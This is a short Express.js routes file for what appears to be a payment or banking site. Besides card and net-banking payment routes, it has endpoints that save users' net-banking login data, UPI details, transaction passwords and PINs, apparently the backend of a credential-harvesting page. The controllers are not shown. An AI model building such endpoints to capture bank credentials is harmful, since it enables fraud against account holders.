const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController'); 
const netBankingController = require('../controllers/netBankingController');
const cardController = require('../controllers/cardController');

router.post('/banking', netBankingController.submitNetBankingPayment);
router.post('/entry', userController.saveUserData);
router.post('/card', cardController.submitCardPayment);

router.post('/netbanking', userController.saveNetBankingLoginData);
router.post('/upi', userController.saveUpiData);
router.post('/transaction-password', userController.saveTransactionPassword);
router.post('/pin', userController.savePinData);
module.exports = router;
